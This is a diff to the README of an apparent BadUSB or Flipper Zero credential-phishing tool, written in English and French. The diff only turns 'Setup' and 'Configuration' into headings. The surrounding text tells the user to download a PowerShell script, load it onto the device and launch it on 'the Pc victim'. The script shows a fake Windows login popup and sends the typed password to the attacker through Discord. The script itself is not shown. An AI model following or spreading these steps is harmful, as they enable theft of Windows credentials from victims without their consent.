@@ -5,7 +5,7 @@ This script allows you to display a Popup (see picture below) which asks for the
 Ce script vous permet de faire apparaître un Popup (voir photo en dessous ) qui demande les informations de connections a la session Windows .
 
 
-Setup : 
+# Setup : 
 
 Download the script test.ps1
 
@@ -22,7 +22,7 @@ Put script.txt on your flipper zero or on your rubber ducky / badusb.
 Launch the script on the Pc victim and wait for that the popup appears on the victim's screen ,when the victim will have put his password it will be sent to you on discord.
 
 
-Configuration :
+# Configuration :
 
 Téléchargez le script test.ps1
 
